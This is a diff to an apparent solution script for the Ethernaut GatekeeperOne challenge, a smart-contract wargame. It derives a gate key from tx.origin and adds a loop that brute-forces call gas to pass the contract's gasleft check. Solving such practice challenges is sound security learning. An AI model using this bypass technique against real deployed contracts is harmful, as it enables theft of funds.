@@ -11,7 +11,7 @@ contract ethernaut13Script is Script{
     function run() public{
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
 
-        attacker attacke = new attacker{value: 1 ether}();
+        attacker attacke = new attacker{value: 0.001 ether}();
 
         attacke.attack(instance);
     
@@ -27,7 +27,18 @@ contract attacker{
         uint64 key = (uint64(1) << 32) | uint64(uint16(uint160(tx.origin)));
         bytes8 gateKey = bytes8(key);
 
-        instance.enter(gateKey);
+        bytes memory payload = abi.encodeWithSignature("enter(bytes8)", gateKey);
+        
+        bool success;
+
+        for(uint256 i = 0;i<8191; i++){
+            (success,) = address(instance).call{gas: 8191 * 3 + i}(payload);
+
+            if(success){
+                break;
+            }
+        }
+        require(success, "failed");
     }
 }
 
